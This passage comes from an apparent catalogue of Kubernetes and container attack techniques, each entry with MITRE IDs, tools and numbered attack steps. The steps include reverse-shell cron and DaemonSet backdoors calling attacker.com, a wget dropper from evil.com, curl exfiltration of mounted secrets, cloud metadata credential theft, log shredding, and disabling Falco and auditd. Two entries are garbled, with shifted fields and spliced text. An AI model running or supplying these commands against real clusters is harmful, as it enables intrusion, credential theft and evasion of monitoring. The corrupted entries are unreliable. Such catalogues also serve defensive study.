- **Attack Steps**: 1. Attacker in one container lists /proc and finds PIDs that don’t match its own container.2. Navigates to /proc/<pid>/cmdline or /proc/<pid>/environ to read command-line args or environment variables.3. Extracts secrets, API keys, tokens passed to peer containers.4. May view running binaries, paths, or internal IPs used.5. In poorly isolated setups, these leaks may span container boundaries.6. Host-wide information can be leaked from /proc/sys or similar.7. Attack is silent, no alerts unless file system activity is monitored.8. Ideal for staging further privilege escalation.
- **Detection**: File integrity monitors, container hardening tools
- **Solution**: Use PID namespaces, restrict /proc access
- **Tags**: #procabuse #isolationfailure #containerleak

## Using Shared tmpfs for Secrets Theft Across Pods

- **Attack Type**: tmpfs Secrets Leak
- **Target**: Kubernetes Shared Volume
- **Vulnerability**: Unrestricted shared memory mounts
- **MITRE**: T1552.001
- **Impact**: Runtime memory-level secret compromise
- **Tools**: bash, kubectl
- **Scenario**: Exploiting a shared emptyDir or tmpfs volume across multiple pods to access secrets in memory.
- **Attack Steps**: 1. Multiple pods in the same namespace mount an emptyDir volume that is backed by tmpfs (RAM).2. One of these pods writes secrets to a file (/tmp/secrets.json) in the shared mount.3. Attacker pod (running as compromised container) accesses same mount path and reads the file.4. Extracts JWTs, DB credentials, or encryption keys from memory.5. Secrets never persisted to disk, so traditional scanners fail.6. TMPFS isolation was assumed, but not enforced per pod.7. Attack is time-sensitive—secrets must exist in memory during access.8. Can be weaponized for short-lived key exfiltration.
- **Detection**: Volume access logs (if enabled), runtime alerts
- **Solution**: Avoid shared tmpfs for sensitive data
- **Tags**: #tmpfsleak #sharedvolumes #k8smemoryleak

## Exploiting Redis with No Auth in Internal Cluster

- **Attack Type**: No-Auth Service Exploitation
- **Target**: Redis Containers
- **Vulnerability**: No auth, internal exposure
- **MITRE**: T1210
- **Impact**: Data theft and potential RCE
- **Tools**: redis-cli, nmap, bash
- **Scenario**: Scanning for and exploiting open Redis service with no authentication inside container cluster.
- **Attack Steps**: 1. Attacker inside container runs nmap -p 6379 10.0.0.0/8 to locate Redis instances.2. Connects with redis-cli -h <target> and gets access without auth.3. Runs CONFIG GET *, INFO, and KEYS * to inspect data.4. May find session tokens, user passwords, internal keys.5. Can run SLAVEOF or set cron jobs in Redis using config set dir + dbfilename + save to achieve RCE.6. Also dumps data and transfers to attacker-controlled service.7. Internal-only assumption fails due to flat network.8. Attack remains undetected unless Redis logs are centrally collected.
- **Detection**: Redis logs, cluster egress patterns
- **Solution**: Enable Redis auth, firewall internal service access
- **Tags**: #redisattack #noauth #containerpivot

## SSRF to Kubernetes API from Exposed Debug Dashboard

- **Attack Type**: SSRF via Internal Debug Tool
- **Target**: Internal K8s Pod
- **Vulnerability**: SSRF path to internal APIs
- **MITRE**: T1190
- **Impact**: Pod manipulation and privilege escalation
- **Tools**: curl, burp, kube-api
- **Scenario**: Using an SSRF vulnerability in a debug tool to send requests to Kubernetes API and manipulate resources.
- **Attack Steps**: 1. Attacker finds exposed internal debug tool (e.g., debug-ui) running in pod.2. Debug panel has parameter accepting URLs.3. Sends SSRF payload: http://kubernetes.default.svc/api/v1/namespaces/kube-system/pods.4. Gets JSON response of all system pods.5. Crafts request to patch or delete privileged pod (e.g., kube-dns, kube-proxy).6. May inject new pod or exec into existing one.7. All via SSRF, without kubectl or service account token.8. Extremely stealthy unless network-layer egress is restricted.
- **Detection**: API server logs, SSRF parameter validation
- **Solution**: Disable debug UIs in production, filter URLs
- **Tags**: #ssrfk8s #debugui #podmanipulation

## Privileged Pod Running Docker Daemon Inside

- **Attack Type**: Docker Daemon Abuse from Pod
- **Target**: Privileged Kubernetes Pod
- **Vulnerability**: Docker daemon exposed inside container
- **MITRE**: T1611
- **Impact**: Host control and Kubernetes bypass
- **Tools**: Docker CLI, bash
- **Scenario**: Pod contains Docker daemon that attacker uses to launch privileged containers or control host Docker engine.
- **Attack Steps**: 1. Attacker compromises a pod running with privileged mode.2. Inside the pod, Docker daemon is exposed or mounted (/var/run/docker.sock).3. Attacker runs docker ps and confirms access to host’s Docker engine.4. Uses docker run --privileged -v /:/mnt to start new container with host root mounted.5. Enters new container and gains root access to host filesystem.6. Attacker plants backdoors, modifies system files, or steals credentials.7. All actions bypass Kubernetes RBAC because Docker access is direct.8. Persistence can be achieved by launching containers on host directly.
- **Detection**: Docker logs, container runtime inspection
- **Solution**: Never expose Docker inside pods, use CRI isolation
- **Tags**: #dockersock #privilegedpod #containerescape

## Inter-Pod Traffic Hijack via ARP Spoofing

- **Attack Type**: ARP Spoofing in Cluster
- **Target**: Kubernetes Pod Network
- **Vulnerability**: Lack of ARP monitoring on pod networks
- **MITRE**: T1557.002
- **Impact**: Traffic interception, MITM
- **Tools**: arpspoof, tcpdump, mitmproxy
- **Scenario**: Malicious container performs ARP spoofing to intercept traffic between other pods on same node or subnet.
- **Attack Steps**: 1. Attacker runs container on same node/network as other sensitive pods.2. Uses arpspoof to send forged ARP responses, claiming IP of target pod.3. Begins receiving traffic intended for that pod (MITM setup).4. Uses tcpdump or mitmproxy to analyze or manipulate traffic.5. Credentials, JWTs, or service calls may be exposed.6. Blue team assumes intra-cluster network is trusted.7. Can be chained with replay or session hijacking attacks.8. Spoofing remains unnoticed if ARP monitoring isn’t enabled.
- **Detection**: ARP table anomalies, pod packet captures
- **Solution**: Enforce network segmentation, use CNI firewall rules
- **Tags**: #arpspoof #interpodattack #networklateralmove

## Persistent Reverse Shell via Cron Job in Compromised Pod

- **Attack Type**: Container Cron Backdoor
- **Target**: Linux-based Pods
- **Vulnerability**: Writable cron, lack of immutability
- **MITRE**: T1053.003
- **Impact**: Persistent shell access in container
- **Tools**: bash, netcat, crontab
- **Scenario**: Attacker implants cron job inside container to reinitiate reverse shell every minute to evade temporary cleanup.
- **Attack Steps**: 1. Gains initial access into container using exposed service or vulnerable endpoint.2. Escalates inside pod and adds new cron job: * * * * * /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1.3. If connection is dropped or container is restarted, shell reinitiates in under 60 seconds.4. Ensures attacker can reconnect persistently.5. Pods that aren’t ephemeral or lack read-only filesystem allow cron creation.6. Hard to detect unless cron files are monitored or image is scanned.7. Blue team may believe issue is resolved if session is killed manually.8. Reinfection is automated and persistent.
- **Detection**: Sysmon/cron logs (if collected), reverse shell alerts
- **Solution**: Use readonly root FS, container immutability
- **Tags**: #cronbackdoor #reverseshell #persistence

## Exploiting Misconfigured Kubernetes Network Policies

- **Attack Type**: Policy Bypass for Lateral Movement
- **Target**: Cluster Pod Network
- **Vulnerability**: No or default-allow network policies
- **MITRE**: T1021
- **Impact**: Cross-namespace access, data compromise
- **Tools**: kubectl, nmap, bash
- **Scenario**: Exploit default-allow or missing Kubernetes NetworkPolicies to move freely between pods/namespaces.
- **Attack Steps**: 1. Attacker lands inside one pod in the cluster (via exposed endpoint or stolen token).2. Uses nmap or curl to scan IP range of other pods.3. Finds services (e.g., MongoDB, Elasticsearch) in other namespaces with open ports.4. Because no network policies are applied, traffic is unrestricted.5. Reads/writes data directly to these services.6. In multi-tenant setups, attacker may cross project boundaries.7. No firewall or pod-level isolation alerts are triggered.8. Lateral movement is fast and silent in default networks.
- **Detection**: Network flows (if monitored), Kubernetes CNI logs
- **Solution**: Apply deny-all default, strict namespace policies
- **Tags**: #networkpolicy #k8sflatnetwork #podisolation

## Sidecar Injection to Intercept Microservice Credentials

- **Attack Type**: Malicious Sidecar Deployment
- **Target**: Kubernetes Workloads
- **Vulnerability**: No validation on manifest changes
- **MITRE**: T1557.001
- **Impact**: Credential interception and relay
- **Tools**: YAML patching, socat, bash
- **Scenario**: Injects sidecar container into deployment YAML to intercept service-to-service credentials.
- **Attack Steps**: 1. Attacker modifies deployment manifest to add malicious sidecar container.2. Sidecar uses socat to listen on microservice port (e.g., 8080) and relay requests.3. Original app remains functional, but all requests/responses flow through attacker container.4. Credentials, headers, API tokens are logged or exfiltrated.5. Sidecar blends in with legitimate components.6. RBAC or GitOps lack may allow such tampering unnoticed.7. Compromise persists until deployment is audited.8. Ideal for credential theft in service meshes or internal APIs.
- **Detection**: Deployment diffs, GitOps drift detection
- **Solution**: Enforce image signatures, audit deployment changes
- **Tags**: #sidecarinject #credentialsteal #yamlpoison

## Cloud Role Abused via Metadata API in Container

- **Attack Type**: Cloud IAM Role Misuse
- **Target**: Container in Cloud Infra
- **Vulnerability**: Overprivileged IAM role, exposed metadata
- **MITRE**: T1552.005
- **Impact**: Cloud account privilege abuse
- **Tools**: curl, aws-cli, gcloud
- **Scenario**: Container fetches instance metadata, uses IAM role to pivot into other cloud services (AWS/GCP).
- **Attack Steps**: 1. Container running in AWS EKS or GCP GKE environment.2. Attacker inside container executes curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>.3. Retrieves temporary credentials (AccessKey, SecretKey, Token).4. Uses aws-cli to list, modify, or delete S3 buckets, IAM roles, etc.5. Moves from container compromise to full cloud resource takeover.6. If role has wide privileges, risk is extreme.7. Exploit often missed unless metadata access is logged.8. Chained with SSRF or pod breakout for stealth.
- **Detection**: CloudTrail, metadata access logs
- **Solution**: Use scoped IAM roles, restrict metadata access
- **Tags**: #iamabuse #metadataapi #eksattack

## Exploit of /var/run/secrets/kubernetes.io ServiceAccount Token

- **Attack Type**: Token Theft via Mounted Secrets
- **Target**: Kubernetes Container
- **Vulnerability**: Auto-mounted, overprivileged service accounts
- **MITRE**: T1528
- **Impact**: Cluster enumeration or privilege escalation
- **Tools**: curl, token, kube-api
- **Scenario**: Reads default service account token from /var/run/secrets/... and uses it to access Kubernetes API.
- **Attack Steps**: 1. Attacker finds container mounting /var/run/secrets/kubernetes.io/serviceaccount/token.2. Reads token content using cat.3. Uses curl to query Kubernetes API: curl -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api.4. Depending on RBAC, can list pods, secrets, configs, etc.5. If misconfigured, default token may have broad access.6. Allows enumeration or manipulation of cluster state.7. Detection is hard unless API logs or audit logs are configured.8. Exploit path is often overlooked in minimal containers.
- **Detection**: K8s API audit logs, access token usage patterns
- **Solution**: Disable auto-mount for non-needful pods
- **Tags**: #k8stoken #servicetokenabuse #apitokenleak

## Docker Image Poisoning via Reverse Shell Entrypoint

- **Attack Type**: Malicious Entrypoint in Build
- **Target**: Public Docker Image
- **Vulnerability**: No image validation or scanning
- **MITRE**: T1204.003
- **Impact**: Code execution inside Kubernetes
- **Tools**: Dockerfile, nc, bash
- **Scenario**: Entrypoint of container image executes reverse shell; attackers wait for image deployment.
- **Attack Steps**: 1. Attacker uploads public image to DockerHub with name like ubuntu-secure or nginx-latest-fixed.2. Inside image, ENTRYPOINT ["/bin/bash", "-c", "bash -i >& /dev/tcp/attacker.com/443 0>&1"].3. Blue team unknowingly pulls image and deploys in Kubernetes.4. As container runs, reverse shell triggers back to attacker.5. Attacker gains shell inside running pod.6. Attack bypasses signature verification if not enforced.7. Dangerous because action is tied to normal deployment process.8. Effective in DevOps pipelines with fast image adoption.
- **Detection**: Network reverse shell logs, container tracing
- **Solution**: Enforce signed image policies, use only verified images
- **Tags**: #dockerpoison #maliciousimage #entrypointattack

## Pivot from App Pod to Internal MySQL via Exposed Port

- **Attack Type**: DB Exploit via Internal Exposure
- **Target**: Kubernetes Internal DB
- **Vulnerability**: No auth, open service config
- **MITRE**: T1210
- **Impact**: Internal DB compromise and data theft
- **Tools**: mysql-client, bash
- **Scenario**: App container accesses internal MySQL server without authentication across the namespace.
- **Attack Steps**: 1. Attacker finds exposed MySQL service in same namespace (e.g., via kubectl get svc).2. Connects using mysql -h mysql.default.svc.cluster.local -u root without password.3. Access granted due to dev/test mode config.4. Dumps sensitive data: credentials, logs, tokens.5. May create new DB users or load UDFs for shell access.6. Attack exploits flat internal network assumptions.7. Security team may assume MySQL is protected by network boundaries.8. Very effective in legacy microservices architectures.
- **Detection**: MySQL logs, pod-to-pod network logs
- **Solution**: Enforce DB auth, restrict internal port access
- **Tags**: #mysqlexploit #inclusterdb #k8sdataleak

## Pivot via Kubernetes DNS to Access Metadata Endpoint

- **Attack Type**: DNS Pivoting to Sensitive Services
- **Target**: K8s Internal DNS System
- **Vulnerability**: No access control over DNS-resolved metadata
- **MITRE**: T1046
- **Impact**: Unauthorized metadata access
- **Tools**: dig, nslookup, curl
- **Scenario**: Use Kubernetes DNS to discover and access sensitive endpoints like cloud metadata or internal APIs.
- **Attack Steps**: 1. Attacker inside compromised pod runs dig for metadata.google.internal.svc.cluster.local or similar.2. Kubernetes DNS resolves internal service names to actual IPs.3. Accesses metadata endpoint (e.g., http://169.254.169.254) using internal route.4. Retrieves IAM roles or GCP service account tokens.5. Uses tokens to interact with external services (e.g., GCP buckets, APIs).6. Attack is subtle because metadata access appears internal.7. Can also discover other service names via DNS fuzzing.8. Blue team unaware unless DNS logs are correlated with egress activity.
- **Detection**: DNS query logs, metadata access logs
- **Solution**: Block metadata access from pods, filter DNS patterns
- **Tags**: #dnspivot #cloudmetadata #dnsrecon

## Overwhelm Falco with Log Noise

- **Attack Type**: Log Flooding via Noisy Syscalls
- **Target**: Kubernetes Pod
- **Vulnerability**: Falco's rule engine lacks prioritization under high load
- **MITRE**: T1562.006 (Event Log Tampering)
- **Impact**: Monitoring fatigue, stealth persistence
- **Tools**: strace, custom shell scripts
- **Scenario**: The attacker generates excessive benign system calls to overwhelm Falco’s monitoring, masking real malicious activity.
- **Attack Steps**: 1. The attacker gains access to a container with Falco installed or running as a sidecar.2. They create a script that endlessly runs noisy but benign syscalls, e.g., using strace -c -f /bin/ls in a loop.3. The script executes basic operations repeatedly (e.g., read/write/exec calls) across multiple forks.4. These operations clutter the Falco event logs, causing CPU/resource exhaustion in detection pipelines.5. Simultaneously, the attacker launches their real malicious payload, which gets hidden in the noise.6. SOC analysts reviewing logs see overwhelming benign syscall entries, masking the real alerts.
- **Detection**: High volume Falco alerts with low severity but high frequency
- **Solution**: Apply rate-limiting and anomaly scoring per container.
- **Tags**: #falco #kubernetes #evasion #lognoise #syscalls #defensebypass

## Inject Malicious CronJob for Backdoor Shell

- **Attack Type**: CronJob Persistence
- **Target**: Kubernetes Cluster
- **Vulnerability**: Inadequate RBAC, lack of audit enforcement
- **MITRE**: T1053.003 (Cron)
- **Impact**: Persistent access, undetected shell
- **Tools**: kubectl, Netcat
- **Scenario**: Attacker deploys a malicious Kubernetes CronJob that schedules a reverse shell every minute, auto-redeploying access.
- **Attack Steps**: 1. Attacker compromises a Kubernetes node and obtains permissions to interact with the cluster.2. They craft a malicious CronJob YAML manifest that spawns a pod with a reverse shell every minute.3. The command within the pod runs nc attacker.com 4444 -e /bin/bash.4. They apply it using kubectl apply -f backdoor-cronjob.yaml.5. Even if the container is terminated, the CronJob ensures it re-runs.6. This creates persistence and a reliable callback to the attacker every minute.
- **Detection**: Repeated pod spawns from same CronJob
- **Solution**: RBAC restriction and image validation policy
- **Tags**: #cronjob #kubernetes #persistence #backdoor #rce #devsecops

## Disable Falco Sidecar via Namespace Kill

- **Attack Type**: Kill Monitoring Agent
- **Target**: Container Runtime
- **Vulnerability**: Lack of integrity check or auto-recovery for security agents
- **MITRE**: T1562.001 (Disable or Modify Tools)
- **Impact**: Blind SOC, unmonitored actions
- **Tools**: kubectl, kill, ps
- **Scenario**: Attacker kills the Falco sidecar container by targeting the specific PID or pod name to disable monitoring silently.
- **Attack Steps**: 1. The attacker inspects running pods via kubectl get pods -A.2. They identify Falco sidecar containers by name or label (e.g., falco-agent, falco-daemonset).3. Using kubectl exec, they enter the pod or container and list PIDs (ps aux).4. They kill the Falco agent process with kill -9 [PID] or delete the pod with kubectl delete pod falco-agent-xyz.5. Logging is immediately halted, and new activity goes undetected.6. They perform malicious actions undetected while Falco is down.7. Optional: Modify the pod lifecycle hook to prevent Falco from restarting.
- **Detection**: Missing heartbeat/logs from Falco pods
- **Solution**: Pod Anti-tamper policies, restart detection
- **Tags**: #falco #sidecar #disableagent #evasion #containers

## Abuse InitContainer to Drop Reverse Shell

- **Attack Type**: InitContainer-Based Payload
- **Target**: bash`.4. The shell runs in background, establishing a connection to the attacker's listener.5. The main container then starts, giving no indication of compromise unless logs or manifests are reviewed.6. On container restart, the InitContainer ensures re-execution of the shell.7. If InitContainer logs are not forwarded or monitored, this activity is easily missed.
- **Vulnerability**: Kubernetes Pod
- **MITRE**: Lack of InitContainer scrutiny or logging
- **Impact**: T1546.003 (Boot or Logon Autostart Execution: Unix Shell Configuration Modification)
- **Tools**: kubectl, bash, Netcat
- **Scenario**: InitContainer is abused to drop payloads before main app container starts, establishing pre-app persistence.
- **Attack Steps**: 1. Attacker modifies a deployment manifest to add an InitContainer.2. The InitContainer runs before the main application starts.3. Its command includes fetching and running a reverse shell: `curl http://attacker.com/rev.sh
- **Detection**: Stealth persistence prior to app startup
- **Solution**: No alerts tied to InitContainer behavior
- **Tags**: Monitor and alert on all InitContainer definitions

## DNS Spoofing via Host Networking

- **Attack Type**: Container-Level DNS Poisoning
- **Target**: Host Networked Container
- **Vulnerability**: Unsafe use of --network=host
- **MITRE**: T1557.001 (Adversary-in-the-Middle: LLMNR/NBT-NS Spoofing)
- **Impact**: Credential theft, service impersonation
- **Tools**: Docker, Dnsmasq
- **Scenario**: With --network=host, attacker poisons local DNS resolver to redirect traffic from other containers.
- **Attack Steps**: 1. Attacker runs a container with elevated privileges and --network=host enabled.2. Inside the container, they install a DNS proxy like dnsmasq or modify /etc/hosts.3. They configure fake entries like api.internal 10.0.0.99 to intercept credentials or secrets.4. Other containers or processes using system resolver trust this poisoned DNS data.5. If a backend or metadata service is queried, traffic is routed to attacker’s proxy.6. Data like JWT tokens, cloud secrets, or internal configs are intercepted.7. Logs and DNS cache are wiped post-exfiltration to erase traces.
- **Detection**: DNS resolution anomalies or mismatches
- **Solution**: Use network policies, avoid host network for untrusted containers
- **Tags**: #dns #hostnetwork #spoofing #containers #intercept

## Overload Auditd to Blind Host Logs

- **Attack Type**: Host Audit Noise Injection
- **Target**: Host OS from Container
- **Vulnerability**: Privileged container with audit access
- **MITRE**: T1562.002 (Disable or Modify Syslog)
- **Impact**: Logging failure, stealth data access
- **Tools**: auditctl, bash, dd
- **Scenario**: Attacker from container overloads auditd on the host via /proc interactions, preventing proper logging.
- **Attack Steps**: 1. Attacker launches a container with privileges to interact with the host /proc.2. Using a mounted host path (e.g., /proc or /dev/audit), they repeatedly write large garbage data or malformed syscalls.3. This overwhelms the auditd buffer and may crash the service depending on configuration.4. While auditd is unresponsive, attacker executes sensitive operations (e.g., reading sensitive mountpoints or creds).5. Logs show gaps or are corrupted.6. Once activity is done, attacker resets the daemon or clears its logs.7. SOC analysts are left with missing event visibility.
- **Detection**: Missing auditd entries, abnormal service restart
- **Solution**: Restrict container access to /proc, use seccomp
- **Tags**: #auditd #linux #logging #containerescape #evasion

## CronJob Executes Binary Dropper

- **Attack Type**: Scheduled Persistence via Binary
- **Target**: Kubernetes Container
- **Vulnerability**: CronJobs with unrestricted script access
- **MITRE**: T1053.003 (Scheduled Task/Job: Cron)
- **Impact**: Persistence with automated binary reinstallation
- **Tools**: kubectl, wget, custom binary
- **Scenario**: Attacker schedules a CronJob that periodically downloads and installs a malicious binary inside a privileged container.
- **Attack Steps**: 1. Attacker uploads a malicious binary (e.g., credential stealer) to a public or attacker-controlled server.2. Inside a compromised container, they create a CronJob to run every 10 minutes.3. The CronJob script runs wget http://evil.com/dropper && chmod +x dropper && ./dropper.4. This ensures the malicious binary persists even if deleted or removed manually.5. Binary may register itself in PATH or tamper with bashrc for execution.6. Logs are muted or redirected to avoid detection.7. The container becomes a permanent foothold.
- **Detection**: Repeated binary download events
- **Solution**: Block external egress + image allowlist
- **Tags**: #cronjob #binarydropper #persistence #kubernetes #rce

## Tamper Falco Rule File from Mount

- **Attack Type**: Modify Detection Rules
- **Target**: Falco Runtime
- **Vulnerability**: Writable Falco config in container
- **MITRE**: T1562.006 (Indicator Removal from Tools)
- **Impact**: Degraded detection capability
- **Tools**: kubectl, vi, falco.yaml
- **Scenario**: The attacker edits Falco rule files mounted into container, disabling key alerts.
- **Attack Steps**: 1. Attacker accesses the container with Falco rule files mounted from the host or ConfigMap.2. They locate falco.yaml or custom rules directory (usually /etc/falco/ or /rules.d).3. They comment out or remove high-severity detection rules, e.g., container escapes or write to sensitive paths.4. Ruleset reload is triggered either by restarting Falco or waiting for auto-reload.5. Malicious activity matching disabled rules now proceeds undetected.6. Optional: attacker adds fake rules to create noise and mask changes.7. SOC assumes normal operations as logs continue, but without effective alerts.
- **Detection**: Rule reload logs mismatch config repo
- **Solution**: Immutable config maps and read-only mounts
- **Tags**: #falco #rules #disablealerts #logtamper #containersecurity

## Exploit DaemonSet for Log Wiper Deployment

- **Attack Type**: DaemonSet Deployer
- **Target**: Kubernetes Node
- **Vulnerability**: Writable access to host logs via DaemonSet
- **MITRE**: T1070.003 (Clear Command History)
- **Impact**: Log destruction across entire cluster
- **Tools**: kubectl, custom shell script
- **Scenario**: Attacker deploys a DaemonSet that mounts host logs and wipes them periodically.
- **Attack Steps**: 1. Attacker gains cluster-admin or privileged permissions.2. They deploy a DaemonSet across all nodes running a pod with host log mount (/var/log).3. The container runs a script that wipes or shreds all logs every hour: find /var/log -type f -exec shred -u {} \;.4. DaemonSet ensures persistence even if individual pods are deleted.5. If the host logs are not mirrored to a central log collector, entire visibility is lost.6. Upon investigation, analysts see normal pod activity with missing logs.7. DaemonSet is hidden with benign-sounding name like log-monitor or node-cleaner.
- **Detection**: Missing logs, inconsistent log sizes
- **Solution**: Restrict hostPath mounts, validate DaemonSet usage
- **Tags**: #daemonset #logwiper #kubernetes #persistence #tampering

## Host Port Listener for Secret Sniffing

- **Attack Type**: Host Network Port Abuse
- **Target**: Host Network
- **Vulnerability**: Excessive privileges and host network exposure
- **MITRE**: T1040 (Network Sniffing)
- **Impact**: Credential theft, secret exfiltration
- **Tools**: Docker, Netcat, tcpdump
- **Scenario**: With --network=host, container listens to secret traffic on common ports like 80, 443, 169.254.169.254.
- **Attack Steps**: 1. Attacker launches a container with --network=host.2. They bind a listener on known sensitive ports (e.g., metadata services or admin APIs).3. Using tools like tcpdump, they begin sniffing raw packets, inspecting HTTP headers and API tokens.4. If other services use insecure protocols or default routes, credentials are captured.5. Traffic is logged and periodically sent to attacker’s remote server.6. If containers restart, a startup script ensures re-listening.7. Optional: use encrypted channel (e.g., stunnel) to exfiltrate stolen data.
- **Detection**: High host network I/O from container
- **Solution**: Prohibit host network unless absolutely required
- **Tags**: #hostnetwork #networksniffing #secrettheft #docker #containers

## Kill Audit Daemon from Privileged Container

- **Attack Type**: Host Audit Agent Kill
- **Target**: grep audit.<br>5. They kill it with pkill -f auditdorsystemctl stop auditd`.6. This halts all audit logging on the host OS.7. The attacker now proceeds to access sensitive files or credentials without detection.
- **Vulnerability**: Host OS via Privileged Container
- **MITRE**: Host PID access via container
- **Impact**: T1562.001 (Disable or Modify Tools)
- **Tools**: systemctl, pkill, kubectl
- **Scenario**: A privileged container is used to stop the host auditd service, blinding logs for all subsequent activity.
- **Attack Steps**: 1. The attacker launches a container with host PID namespace and elevated privileges.2. They mount the host filesystem using --volume /:/host and access /host/bin, /host/etc.3. Inside the container shell, they chroot into the host: chroot /host.4. Once inside, they locate the audit daemon process using `ps aux
- **Detection**: Logging blind spots, post-kill stealth
- **Solution**: Missing audit logs from host
- **Tags**: Use AppArmor, seccomp, disable privileged containers

## Use DaemonSet to Auto-Recreate Backdoor

- **Attack Type**: Persistent Backdoor DaemonSet
- **Target**: Kubernetes Cluster
- **Vulnerability**: Unmonitored DaemonSet creation
- **MITRE**: T1053.005 (Scheduled Task/Job: Scheduled Task)
- **Impact**: Persistent root-level access
- **Tools**: kubectl, Netcat, Bash
- **Scenario**: A DaemonSet is deployed to recreate a malicious pod on every node, ensuring persistent access across cluster restarts.
- **Attack Steps**: 1. The attacker creates a malicious pod spec with a reverse shell command (e.g., to attacker.com:4444).2. They wrap the pod spec into a DaemonSet YAML manifest.3. They use kubectl apply -f backdoor-daemonset.yaml to deploy it cluster-wide.4. Every node now has a backdoor container running silently.5. If security teams delete one pod, the DaemonSet controller recreates it automatically.6. The attacker monitors incoming connections and maintains access.7. They give the DaemonSet a misleading name like metrics-agent to avoid suspicion.
- **Detection**: Repeated reverse shell pod spawns
- **Solution**: Lock down DaemonSet creation via RBAC
- **Tags**: #daemonset #k8s #persistence #backdoor #containers

## Hijack Falco Rule Reload Trigger

- **Attack Type**: Misuse Falco Hot Reload
- **Target**: Container Monitor
- **Vulnerability**: Falco reloads without integrity verification
- **MITRE**: T1562.006 (Indicator Removal from Tools)
- **Impact**: Alert suppression without downtime
- **Tools**: Falco, Bash
- **Scenario**: Attacker triggers Falco’s auto-reload mechanism after tampering with the ruleset to disable detections.
- **Attack Steps**: 1. Attacker gains access to a container or node where Falco is running.2. They modify the Falco configuration file or rules YAML (/etc/falco/falco_rules.yaml).3. Malicious change disables specific rules like write to sensitive files or spawn shell in container.4. Instead of restarting Falco, they touch the config or signal the process to reload: kill -HUP $(pidof falco).5. Falco reloads the modified rules, continuing to run but with reduced visibility.6. The attacker exploits the blind spots now present.7. Security teams monitoring Falco dashboards see no drop in status.
- **Detection**: No error from Falco, but detection reduced
- **Solution**: Use checksums + GitOps for rule sync
- **Tags**: #falco #rulemanipulation #evasion #containersecurity

## Schedule InitContainer with Secret Dump

- **Attack Type**: InitContainer Secret Harvester
- **Target**: Kubernetes Deployment
- **Vulnerability**: Improper InitContainer isolation or monitoring
- **MITRE**: T1552.004 (Unsecured Credentials)
- **Impact**: Stealthy credential exfiltration before app starts
- **Tools**: kubectl, Bash, Curl
- **Scenario**: Attacker abuses an InitContainer to read Kubernetes secrets before the main application loads, then exfiltrates them to an external server.
- **Attack Steps**: 1. The attacker gains access to a deployment spec — either by compromising the CI/CD pipeline, Helm charts, or by editing manifests via elevated kubectl privileges.2. They modify the deployment to include a new InitContainer definition.3. This InitContainer is configured to run before the main app container starts and has access to the same mounted secrets (e.g., mounted from /var/run/secrets/kubernetes.io/serviceaccount).4. Within the InitContainer, a script is executed that performs cat /mnt/secrets/* to read all secret files, including service tokens, DB credentials, API keys, or TLS certificates.5. The output of this command is piped to a curl request or nc connection like curl -X POST attacker.com --data-binary @secrets_dump.txt to exfiltrate the information externally.6. The InitContainer finishes execution, allowing the main application to launch as if nothing happened — no disruption is caused, so the attack remains hidden unless specifically audited.7. Because InitContainer logs are not always forwarded to central logging systems, this secret exfiltration may go unnoticed by default.8. The attacker now has access to stolen credentials and may use them to laterally move within the cluster or access cloud APIs.
- **Detection**: Lack of InitContainer log review or network egress control
- **Solution**: Enforce egress restrictions on InitContainers, validate image sources, and use admission controllers to detect unusual InitContainer behavior
- **Tags**: #initcontainer #secretleak #kubernetes #credentialtheft #evasion

## DNS Interception via Host Mode Container

- **Attack Type**: Network Sniffing via Host Stack
- **Target**: Host Networked Container
- **Vulnerability**: Host DNS traffic exposed to container
- **MITRE**: T1040 (Network Sniffing)
- **Impact**: Information disclosure, mapping services
- **Tools**: Docker, tcpdump
- **Scenario**: Attacker listens to DNS queries on host network interface to map internal service names.
- **Attack Steps**: 1. Attacker runs a container with --network=host.2. Inside the container, they install tcpdump or tshark.3. They run tcpdump -i any port 53 to capture DNS traffic.4. This reveals internal service names like db.default.svc.cluster.local, exposing sensitive architecture.5. They monitor and log these names for later phishing or lateral movement.6. Captured queries may also expose metadata or SaaS endpoint usage.7. Once done, they clear container logs and stop the listener.
- **Detection**: Unusual DNS query rates from container
- **Solution**: Avoid host networking, enforce strict DNS policies
- **Tags**: #dns #hostnetwork #sniffing #containers #internalmapping

## Use CronJob to Rotate Malicious SSH Keys

- **Attack Type**: SSH Persistence via CronJob
- **Target**: Kubernetes Pod
- **Vulnerability**: SSH access with writable volume
- **MITRE**: T1053.003 (Scheduled Task/Job: Cron)
- **Impact**: Continuous backdoor, credential injection
- **Tools**: kubectl, Bash
- **Scenario**: CronJob periodically injects attacker's SSH key into authorized_keys inside container.
- **Attack Steps**: 1. Attacker gets access to a container with a user that has SSH enabled.2. They schedule a CronJob that runs every 5 minutes and appends their public key to ~/.ssh/authorized_keys.3. Even if the key is removed by a defender, it is re-added shortly after.4. They obfuscate the script and name the CronJob something benign like log-sync.5. The job writes to logs silently and retries failed injections.6. Attacker uses SSH from outside to access the pod periodically.7. The persistence mechanism bypasses container rebuilds if volumes persist.
- **Detection**: Unexpected changes to SSH keys
- **Solution**: Disable SSH in containers, audit CronJobs
- **Tags**: #ssh #cronjob #kubernetes #backdoor #persistence

## Modify Falco Log Output Location

- **Attack Type**: Redirect Log Output
- **Target**: Falco Agent
- **Vulnerability**: Writable config path
- **MITRE**: T1562.006 (Indicator Removal from Tools)
- **Impact**: Silent mislogging, alert blindness
- **Tools**: falco.yaml, Bash
- **Scenario**: Falco is reconfigured to log to a fake or inaccessible location, suppressing real alerts.
- **Attack Steps**: 1. Attacker accesses Falco’s config file via mounted volume or container.2. They modify falco.yaml to change output destination to /dev/null or an attacker-controlled file path.3. After modifying the path, they reload Falco using HUP signal.4. Now, no real alerts reach the log file or monitoring platform.5. Attacker performs malicious actions while Falco silently logs to a fake path.6. Analysts believe no alerts have been triggered.7. Optional: use symbolic link tricks to redirect logs silently.
- **Detection**: Sudden drop in alert rates
- **Solution**: Use immutable config and monitored output
- **Tags**: #falco #logtampering #outputredirection #evasion #kubernetes

## Pod Using Host Network Sniffs Cloud Metadata

- **Attack Type**: Metadata Harvest via Host Net
- **Target**: Host Networked Pod
- **Vulnerability**: Metadata service exposure
- **MITRE**: T1557.001 (Adversary-in-the-Middle)
- **Impact**: Cloud credential theft
- **Tools**: curl, Docker
- **Scenario**: Attacker uses host networking to intercept cloud metadata (e.g., IAM tokens).
